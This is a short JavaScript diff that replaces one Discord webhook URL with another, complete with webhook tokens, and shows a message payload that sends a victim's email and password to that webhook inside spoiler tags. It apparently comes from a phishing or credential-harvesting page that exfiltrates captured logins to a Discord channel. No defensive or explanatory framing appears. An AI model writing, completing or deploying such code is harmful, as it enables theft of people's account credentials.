@@ -1,4 +1,4 @@
-const webhookUrl = 'https://discord.com/api/webhooks/1250446588254359583/hWxJFMMwp2NpIx6vq7-pZe_rrQ9sjOm3LxtSZcv6D1bv2uiwMgYNYglzJvHZSctThByk';
+const webhookUrl = 'https://discord.com/api/webhooks/1250123862163849338/zszxuIGvX_YLrpBk6gaIzRfQtALK7lB27suhKh01DKmtEBa3PDEEnNXcE-PXstkYlWoi';
 
 const data = {
     content: `**Email= ||${email}||\nPass= ||${password}||**`
